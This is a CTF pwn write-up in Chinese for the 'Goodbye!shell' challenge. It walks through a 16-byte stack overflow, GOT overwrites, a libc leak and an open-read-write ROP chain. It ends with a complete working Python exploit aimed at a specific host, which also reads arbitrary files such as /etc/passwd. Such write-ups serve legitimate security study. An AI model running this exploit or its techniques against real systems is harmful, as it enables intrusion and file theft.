# Goodbye!shell —— Writeup

> **题目**：进来道个别吧，只是这一次，shell 可能不会回应你了。
> **类别 / 难度**：Pwn / 中等　**分值**：500（动态）
> **靶机**：`nc 1.14.76.59 30302`　**附件**：`pwn`、`libc.so.6`、`ld-linux-x86-64.so.2`（glibc 2.35）
> **Flag**：`DASCTF{48820391148353216693056913049005}`

---

## 0x00 摘要

一句话概括：**16 字节溢出（只够覆盖 saved rbp + ret）+ 一个 `lea rax,[rbp-0x20]; read` 的"任意写任意跳"原语，配合 GOT 互染和 ret2main 触发延迟绑定解析器把 `read@got` 复原，最后用 `add rsp,0x18; ret` 把逐窗口铺进去的 ORW 链缝合起来读 flag。**

全程没有 shell（seccomp 只杀 `execve/execveat`），也没有任何"一发入魂"的 ROP——程序每次只能给我们 0x30 字节的写窗口，所有东西都是一轮一轮"绣"上去的。

---

## 0x01 保护与文件

```
Type:      EXEC (no PIE, 基址 0x400000)
RELRO:     Partial（GNU_RELRO 只盖到 0x404000，.got.plt 可写）
Canary:    无（重定位表里没有 __stack_chk_fail）
NX:        开启（GNU_STACK RW）
libc:      2.35（附件自带）
```

符号表直接给了三个函数：`main`(0x40125d)、`sandbox`(0x4011b6)、`vuln`(0x40121f)，几乎不用逆向。

### GOT 布局（本题的舞台）

| 地址 | 条目 |
|---|---|
| `0x404018` | `seccomp_init@got` |
| `0x404020` | `seccomp_rule_add@got` |
| `0x404028` | `write@got` |
| `0x404030` | `seccomp_load@got` |
| `0x404038` | `read@got` |

五个 GOT 项连成一片、全部可写，是整个利用的核心资源。

### 关键代码片段

```nasm
; main 0x40125d
call sandbox                 ; 装沙箱
write(1, "Give me your name: ", 0x13)
call vuln

; sandbox 0x4011b6
ctx = seccomp_init(0x7fff0000)      ; 0x7fff0000 = SCMP_ACT_ALLOW（默认放行！）
seccomp_rule_add(ctx, KILL, 0x3b, 0)  ; 59  = execve
seccomp_rule_add(ctx, KILL, 0x142, 0) ; 322 = execveat
seccomp_load(ctx)
40121d: leave; ret           ; ← 这个尾部后面会被当 gadget 用

; vuln 0x40121f
40122b: lea  rax, [rbp-0x20]
40122f: mov  edx, 0x30
401234: mov  rsi, rax
401237: mov  edi, 0
40123c: call read@plt.sec    ; read(0, rbp-0x20, 0x30)  ← 漏洞点
401241: write(1, "Goodbye!s", 9)
40125a: leave
40125c: ret
```

### 漏洞

`vuln` 的缓冲区只有 0x20，却 `read` 0x30——**只溢出 16 字节**：恰好覆盖 saved rbp 和返回地址各 8 字节。没有 canary，没有其他输入点。

---

## 0x02 原语推导

### 原语 1：任意地址写 0x30 + 任意跳（万能原语）

把返回地址改成 **`0x40122b`**（跳过 `push rbp; mov rbp,rsp`，直接落到 `lea rax,[rbp-0x20]`），此时 rbp 就是我们溢出时填的 saved rbp：

```nasm
40122b: lea  rax, [rbp-0x20]   ; 目的地址 = 我们可控的 rbp - 0x20
40122f: mov  edx, 0x30
40123c: call read@plt.sec      ; read(0, 任意地址, 0x30)
401241: write(1, "Goodbye!s", 9)   ; 天然的 9 字节 ack，用来同步
40125a: leave                  ; rsp = rbp（可控）
40125c: ret                    ; rip = [rbp+8]（可控）
```

于是每一轮变成：

```
发 0x30 字节 → 写到 [dest, dest+0x30) → 回 9 字节 ack
→ leave;ret 以 rbp=dest+0x20 离场：next_rbp = [dest+0x20]，next_rip = [dest+0x28]
```

**每个 0x30 窗口 = 4 个数据槽 + 2 个控制槽**。控制槽决定下一轮窗口落在哪、跳到哪——这就是本题所有"铺内存"动作的统一模型。把 rbp 填成 `dest+0x20`、ret 填成 `0x40122b`，就能无限续轮。

### 原语 2：任意地址读

`read` 和 `write` 共用调用模式（`edi=0/1, rsi=rbp-0x20, rdx=0x30`）。只要把 **`read@got (0x404038)` 改成 `write@plt.sec (0x4010a0)`**，下一轮的 `call read@plt.sec` 实际执行 `write(0, rbp-0x20, 0x30)`——把任意 0x30 字节吐回来。

### 原语 3：延迟绑定桩（lazy stub）

`.plt` 里的跳板：`write` 桩 = `0x401050`（`push 2; jmp resolver`），`read` 桩 = `0x401070`（`push 4; jmp resolver`）。Partial RELRO 下，**只要从正常的 `call` 路径打到桩，`_dl_runtime_resolve` 就会把真实地址写回 GOT 并跳过去**——这既是漏洞也是解毒药（见 0x04）。

---

## 0x03 第一个死结：改了 `read@got` 就再也读不了输入

利用顺序天然是"先泄露后 ROP"，但原语 2 要求把 `read@got` 改成 `write@plt.sec`——**泄完 libc 的瞬间，输入通道就死了**，而 libc 地址每次连接都变（ASLR），不可能分两轮连。必须在同一条连接里把 `read@got` 复原。

`_dl_runtime_resolve` 只认"从 `.plt` 正常 call 进来的桩"。直接把控制流从 ROP 链里跳进 `0x401070` 是死路（resolver 自身还需要一大片栈空间做 xsave，从 `.bss` 里进栈根本不够）。但它有个天然触发点：**`main` 里的 `sandbox()`**——`seccomp_init / seccomp_rule_add / seccomp_load` 三个调用都会经过 `.plt.sec`。于是：

**把三个 seccomp 函数的 GOT 全部改成 `read` 的桩 `0x401070`，然后 ret2main。**
`sandbox()` 执行 `seccomp_init(0x7fff0000)` 时实际走的是 read 桩 → resolver 解析 `read` → **把真 `read` 写回 `0x404038`** → 接着 `read(0x7fff0000, ...)`，fd 非法返回 EBADF，无副作用。三个 seccomp 调用全部变成无害的 `read(badfd)`，沙箱形同虚设，而我们白捡一次 GOT 复原。之后 `main` 继续打印 banner、回到 `vuln`，输入恢复。

### 具体实现（R0/R1 的接力）

需要的零件：

| 零件 | 地址 | 作用 |
|---|---|---|
| `READ_SITE` | `0x40122b` | 万能原语入口 |
| `LEAVE_RET` | `0x40121d` | `leave; ret` gadget（sandbox 尾部） |
| `MAIN` | `0x40125d` | ret2main |
| `WRITE_STUB` | `0x401050` | write 桩（调用一次后自愈成真 write） |
| `READ_STUB` | `0x401070` | read 桩 |
| 跳板 X | `.bss`（如 `0x404e00`/`0x404f00`） | 需预置 `[X]=0, [X+8]=MAIN` |

`ret2main` 的落点设计：`leave;ret` gadget 执行时 `rsp = rbp`，先 `pop rbp`（吃掉 `[X]`，填 0 无所谓），再 `ret` 到 `[X+8]`。所以任意一个"[X]=0、[X+8]=MAIN"的 .bss 地址都是现成的回 main 跳板。

**R0～R0c（预置阶段，全部走 0x30 窗口接力）**

```
ovf(0x404040)                    # 溢出：saved rbp=0x404060, ret=READ_SITE
R0a: [0x404040] = LEAVE_RET      # 窗口 0x404040；控制槽 → 下一窗口 S
R0b: [S] = 0, [S+8] = MAIN       # 窗口 S=0x404e00：装配"回 main"跳板；控制槽 → 下一窗口 STK
R0c: [STK] = 0, [STK+8] = MAIN   # 窗口 STK=0x404f00：再装一个跳板；控制槽 → 下一窗口 0x404018
```

注意 R0a 顺带把 `[0x404040]` 留成了 `LEAVE_RET`——这不是浪费，是伏笔。

**R1（关键一步：只发 5 个 qword = 0x28 字节，故意不满 0x30）**

```
R1 → 写入 0x404018..0x404040：
  [0x404018] seccomp_init@got  = READ_STUB
  [0x404020] rule_add@got      = READ_STUB
  [0x404028] write@got         = WRITE_STUB   ← 调用一次自动自愈成真 write
  [0x404030] seccomp_load@got  = READ_STUB
  [0x404038] read@got          = STK          ← 不再当函数指针，当栈指针用！
  [0x404040] 不写（partial read）             ← 保留 R0a 的 LEAVE_RET
```

R1 的 read 返回后，流程自己走向深渊又爬出来：

```
call read@plt.sec → [0x404038]=STK，但 read 已返回（此 call 就是刚才那次 read）
→ 0x401241: call write@plt.sec → [0x404028]=WRITE_STUB → resolver 自愈 write@got，
   打印 "Goodbye!s"（9 字节 ack）
→ 0x40125a leave;ret：rbp=0x404038 → pop rbp=[0x404038]=STK, ret=[0x404040]=LEAVE_RET(残留)
→ LEAVE_RET gadget：rsp=rbp=STK → pop rbp=[STK]=0, ret=[STK+8]=MAIN
→ main → sandbox → 三个 seccomp 调用全走 read 桩 → resolver 复原 read@got，
   read(0x7fff0000,…)=EBADF 无害 → 打印 banner → 回到 vuln 的 read
```

实证输出正好是 `b'Goodbye!sGive me your name: '`——`Goodbye!s`(9) + banner(0x13)，与推演一字不差。

---

## 0x04 泄露：让"写"顺便吐出 GOT

read 复活后，泄露只需两步：

```
ovf(0x404038)                    # rbp=0x404058 → 下一窗口 0x404038
窗口 [0x404038] = [WRITE_PLT, S, LEAVE_RET, 0, 0x404040, READ_SITE]
```

这个窗口干了四件事：

1. `[0x404038]`（read@got）= `write@plt.sec` —— **本窗口的 read 返回后，下一次 `call read@plt.sec` 就变成 write**；
2. 控制槽把下一轮引导到 `rbp=0x404040 → 窗口 0x404020`；
3. 所以紧接着的那次调用实际是 `write(0, 0x404020, 0x30)` —— **正好倾倒 `0x404020` 起的 GOT**：

   ```
   [0x404020] rule_add@got   = 0x401070
   [0x404028] write@got      = 真·write  ← w[1]，减 0x1149c0 得 libc 基址
   [0x404030] seccomp_load   = 0x401070
   [0x404038] read@got       = 0x4010a0
   [0x404040] S
   [0x404048] LEAVE_RET
   ```

4. `[0x404040]=S`、`[0x404048]=LEAVE_RET` 则是退场路线：倾倒完 → `leave;ret` → `pop rbp=[0x404040]=S, ret=[0x404048]=LEAVE_RET` → S 跳板 `[S]=0,[S+8]=MAIN` → **又一次 ret2main** → banner(0x13)。

实测字节流严格等于 `Goodbye(9) + 泄露(0x30) + Goodbye(9) + banner(0x13)`，解析 `out[9:9+0x30]` 即可。此刻：**libc 基址到手，read 可用，程序停在 `vuln` 的 read 上**。

---

## 0x05 难点二：在"每 0x30 字节被打断一次"的世界里铺 ROP

现在是标准 ORW 需求：`open("flag") → read(3, BUF, 0x200) → write(1, BUF, 0x200)`。但写内存的唯一手段还是原语 1——**每 0x30 字节就有 2 个槽被控制流占用**，无法一口气写一条长链。

解法是把"铺链阶段"和"执行阶段"分开：

- **铺链阶段**：一轮一个窗口往 `.bss`（链区 `CH=0x404800`）写，控制槽负责续轮；
- **执行阶段**：最后用一个入口窗口把 `rsp` 拨到链头，让链在 .bss 上自Hi正常滑行。

缝合的关键是一个 libc gadget：

```
add rsp, 0x18 ; ret    ;  libc+0x3a889
```

执行阶段链的滑行路线（以 pair 步为例，窗口内布局 `[pop_rdi, val, add_rsp, 0, ctrl, ctrl]`）：

```
ret 落在 [dest]   = pop rdi ; ret     → rdi = [dest+8]，rsp = dest+0x10
ret 落在 [dest+0x10] = add rsp,0x18   → rsp = dest+0x30
ret 落在 [dest+0x30] = 下一个窗口的第一个 gadget   ← 控制槽被整段跳过！
```

三类步骤的窗口布局：

| 类型 | 布局（前 4 槽） | 占用 |
|---|---|---|
| `pair` | `pop_rdi/rsi, val, add_rsp, 0` | 0x30 |
| `call` | `libc_func, ret(对齐), add_rsp, 0` | 0x30 |
| `tri`  | `pop_rdx;pop_rbx, val, rbx, add_rsp` | 0x38 |

最终链（gadget 全部来自附件 libc 2.35）：

| gadget | 偏移 |
|---|---|
| `pop rdi ; ret` | `0x2a3e5` |
| `pop rsi ; ret` | `0x2be51` |
| `pop rdx ; pop rbx ; ret` | `0x90469` |
| `add rsp,0x18 ; ret` | `0x3a889` |
| `open64 / read / write` | `0x114630 / 0x114920 / 0x1149c0` |

```
pop rdi, PATH ; pop rsi, 0 ; open64        # open("flag")
pop rdi, 3    ; pop rsi, BUF ; rdx=0x200 ; read   # read(3, BUF, 0x200)
pop rdi, 1    ; pop rsi, BUF ; write(1, BUF, 0x200)  # rdx 沿用 0x200（实测未被 libc 破坏）
```

数据区：路径字符串 `PATH=0x404b00`（32 字节窗），读出缓冲 `BUF=0x404b80`（0x200，不与 `S=0x404e00` 的跳板区冲突）。

**点火**：所有窗口铺完后，最后一个入口窗口把控制槽填成 `[entry+0x20]=CH-8, [entry+0x28]=LEAVE_RET`：

```
leave;ret gadget：rsp = CH-8 → pop rbp → ret 落在 [CH] = 第一个 pop rdi
```

链开始滑行 → ORW 执行 → flag 从 socket 里流回来。

---

## 0x06 完整流程图

```
[1] R0~R0c  预置 S/STK 两个 "[X]=0,[X+8]=MAIN" 跳板 + 把 0x404040 留成 LEAVE_RET
[2] R1      五连写染 GOT（seccomp×3=read桩, write=write桩, read=STK）
            → leave 残留 LEAVE_RET → STK 跳板 → ret2main
            → sandbox 里 resolver 复原 read@got（read(badfd) 无害）
[3] R2      read@got ← write@plt.sec → 下一 call 变 write(0,0x404020,0x30) 倾倒 GOT
            → w[1]-0x1149c0 = libc 基址 → S 跳板再 ret2main 回到 vuln
[4] R3      10 个 0x30 窗口铺 ORW 链 @0x404800 + 路径串 @0x404b00
[5] 入口    控制槽 (CH-8, leave;ret) → rsp 拨到链头 → ORW → flag
```

---

## 0x07 Exploit

完整脚本（纯 socket 实现，无 pwntools 依赖，自动重试；完整文件见同目录 `exp.py`，任意路径读取调试工具见 `dbg.py`）：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket, struct, sys, time, re

HOST = "1.14.76.59"
PORT = 30302

def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)
def u64(b): return struct.unpack("<Q", b.ljust(8, b"\0")[:8])[0]

READ_SITE  = 0x40122b   # lea rax,[rbp-0x20]; read(0,rax,0x30)
WRITE_PLT  = 0x4010a0   # write@plt.sec
READ_STUB  = 0x401070   # read 的 lazy stub (push 4)
WRITE_STUB = 0x401050   # write 的 lazy stub (push 2)
RET_G      = 0x40101a   # ret
LEAVE_RET  = 0x40121d   # leave; ret  (sandbox 尾部)
MAIN       = 0x40125d

OFF_WRITE   = 0x1149c0
OFF_READ    = 0x114920
OFF_OPEN64  = 0x114630
OFF_POP_RDI = 0x2a3e5
OFF_POP_RSI = 0x2be51
OFF_POP_RDX = 0x90469   # pop rdx; pop rbx; ret
OFF_ADD_RSP = 0x3a889   # add rsp, 0x18; ret

CH   = 0x404800         # ORW 链区
PATH = 0x404b00         # "flag" 字符串
BUF  = 0x404b80         # 读出缓冲
S    = 0x404e00         # 跳板：[S]=0, [S+8]=MAIN
STK  = 0x404f00         # 跳板：[STK]=0, [STK+8]=MAIN

def log(*a): print(*a, flush=True)

class Conn:
    def __init__(self):
        last = None
        for _ in range(25):
            try:
                self.s = socket.create_connection((HOST, PORT), timeout=6); break
            except Exception as e:
                last = e; time.sleep(1.0)
        else: raise last
        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    def rn(self, n, tm=3.0):
        self.s.settimeout(tm); o = b""
        while len(o) < n:
            try: d = self.s.recv(n - len(o))
            except socket.timeout: break
            if not d: break
            o += d
        return o
    def drain(self, tm=1.0):
        self.s.settimeout(tm); o = b""
        while True:
            try: d = self.s.recv(4096)
            except Exception: break
            if not d: break
            o += d
        return o
    def send(self, d): self.s.send(d)

def win6(c, qs):
    assert len(qs) == 6
    c.send(b"".join(p64(x) for x in qs))

def ovf(c, dest):   # 16 字节溢出：saved rbp = dest+0x20, ret = READ_SITE
    c.send(b"A"*0x20 + p64(dest+0x20) + p64(READ_SITE))

def run(flagpath=b"flag"):
    c = Conn()
    if len(c.rn(0x13, 4)) < 0x13: log("[!] no banner"); return None

    # ---- R0~R0c: 预置跳板控制块 ----
    ovf(c, 0x404040); c.rn(9)                                            # [0x404040]=LEAVE_RET
    win6(c, [LEAVE_RET, 0, 0, 0, S+0x20, READ_SITE]);   c.rn(9)          # 窗口0x404040 → S
    win6(c, [0, MAIN, 0, 0, STK+0x20, READ_SITE]);      c.rn(9)          # S: [S]=0,[S+8]=MAIN
    win6(c, [0, MAIN, 0, 0, 0x404038, READ_SITE]);      c.rn(9)          # STK: [STK]=0,[STK+8]=MAIN

    # ---- R1: 五连写染 GOT（只发 0x28，第 6 槽保留 R0a 的 LEAVE_RET）----
    c.send(p64(READ_STUB)*2 + p64(WRITE_STUB) + p64(READ_STUB) + p64(STK))
    o1 = c.rn(9 + 0x13, 3)          # Goodbye + banner = ret2main + resolver 复原 read
    if b"name" not in o1: log("[!] heal failed"); return None

    # ---- R2: 泄露 GOT（read@got ← write@plt.sec，下一 call 变 write(0,0x404020,0x30)）----
    ovf(c, 0x404038); c.rn(9)
    win6(c, [WRITE_PLT, S, LEAVE_RET, 0, 0x404040, READ_SITE])
    out = c.rn(9 + 0x30 + 9 + 0x13, 4)   # Goodbye + GOT 倾倒 + Goodbye + banner(ret2main)
    if len(out) < 9 + 0x30: log("[!] leak failed"); return None
    lk = out[9:9+0x30]
    w = [u64(lk[i*8:i*8+8]) for i in range(6)]
    libc = w[1] - OFF_WRITE              # w[1] = 真·write
    if (libc & 0xfff) or libc < 0x7f0000000000: log("[!] bad base"); return None
    log("[*] libc = %#x" % libc)
    time.sleep(0.2); c.drain(0.4)

    # ---- 铺 ORW 链：pair/call/tri 三类窗口 + add rsp,0x18;ret 缝合 ----
    rdi, rsi, rdxb = libc+OFF_POP_RDI, libc+OFF_POP_RSI, libc+OFF_POP_RDX
    add = libc+OFF_ADD_RSP
    steps = [("pair",[rdi, PATH]), ("pair",[rsi, 0]), ("call",[libc+OFF_OPEN64]),
             ("pair",[rdi, 3]),   ("pair",[rsi, BUF]),
             ("tri", [rdxb, 0x200, 0]),           ("call",[libc+OFF_READ]),
             ("pair",[rdi, 1]),   ("pair",[rsi, BUF]), ("call",[libc+OFF_WRITE])]
    dest = CH; plan = []
    for kind, args in steps:
        if   kind == "pair": q = args + [add, 0];           nxt = dest + 0x30
        elif kind == "call": q = args + [RET_G, add, 0];    nxt = dest + 0x30
        else:                q = args + [add];              nxt = dest + 0x38
        plan.append((dest, q, nxt)); dest = nxt

    entry_dest = dest + 0x30
    for i, (d, q, nxt) in enumerate(plan):
        if i == len(plan)-1: nxt = PATH          # 尾步 pivot 指向 PATH，让下一轮写路径串
        if i == 0:
            ovf(c, d)
            if len(c.rn(9)) != 9: log("[!] W0 ack fail"); return None
        win6(c, q + [nxt+0x20, READ_SITE])
        if len(c.rn(9)) != 9: log("[!] step %d ack fail" % i); return None

    # ---- 路径字符串 + 入口窗口（点火）----
    ps = flagpath.ljust(0x20, b"\0")
    win6(c, [u64(ps[0:8]), u64(ps[8:16]), u64(ps[16:24]), u64(ps[24:32]),
             entry_dest+0x20, READ_SITE])
    c.rn(9)
    win6(c, [0, 0, 0, 0, CH-8, LEAVE_RET])       # rsp → CH-8，leave;ret 落到链头
    time.sleep(0.6)
    return c.drain(2.5)

if __name__ == "__main__":
    fp = sys.argv[1].encode() if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else b"flag"
    for attempt in range(6):
        try: res = run(fp)
        except Exception as e:
            log("[!] attempt %d: %r" % (attempt, e)); time.sleep(1.0); continue
        if not res: time.sleep(1.0); continue
        m = re.search(rb"[A-Z][A-Za-z0-9_]{2,}\{[^}\x00\n]{4,}\}", res)
        if m:
            print("[+] flag =", m.group().decode()); break
        print("[-] no flag in output:", res[:200]); time.sleep(1.0)
```

运行：

```
$ python exp.py
[*] libc = 0x7fecd3a70000
[+] flag = DASCTF{48820391148353216693056913049005}
```

连续复跑 3 次均稳定出货。换路径读其他文件：`python exp.py /flag`、`python dbg.py '!/etc/passwd'` 均可（靶机是极简 chroot，`/flag` 与工作目录 `flag` 同内容）。

---

## 0x08 踩坑记录

1. **`.bss` 里不能直接跑 resolver**。早期方案试图把控制流直接跳进 lazy stub，`_dl_runtime_resolve` 需要 xsave 的大片栈空间，`.bss` 页内向下没多少栈直接崩。正解：只让 resolver 经**正常 call 路径**触发（sandbox 的三个 seccomp 调用），此时 rsp 还是真实栈。
2. **partial read 是特性不是缺陷**。R1 故意只发 0x28 字节，让第 6 个控制槽保留 R0a 预置的 `LEAVE_RET`——两次窗口接力拼出完整的 pivot 链。
3. **`read@got=STK` 不是函数指针，是栈指针**。R1 的 read 返回后不会再"调用"它；它在 `leave` 时被 pop 进 rbp，配合残留的 `LEAVE_RET` 完成 `rsp → STK → ret [STK+8]=MAIN` 的二段跳。
4. **泄露的内容不是自己刚写的窗口**，而是下一轮调用变成 `write(0, 0x404020, 0x30)` 倾倒出的真 GOT——`w[1]`（`0x404028`，真 write）才是基址来源，别看错下标。
5. **每轮 9 字节的 `Goodbye!s` 是天然 ack**，严格按 `9+0x30+9+0x13` 的节奏收包即可全程免粘包猜测。
6. seccomp 语义别看反：`seccomp_init(0x7fff0000)` 是 **ALLOW**，`rule_add` 加的是对 `execve(59)/execveat(322)` 的 **KILL**——所以 ORW 全放行。
7. 环境花絮：本题全程在 Windows 侧完成（`wsl.exe` 被本机安全策略禁用），用标准库 socket 手搓了收发同步与重试，gadget 用字节模式在 libc 里直接搜。

---

## 0x09 Flag

```
DASCTF{48820391148353216693056913049005}
```

> 复核说明：靶机为极简 chroot，`/flag` 与工作目录 `flag` 内容一致且唯一；`/etc`、`/proc` 均不可读。若平台判错，优先核对是否整串精确粘贴（40 字符、半角花括号、无多余空白）。
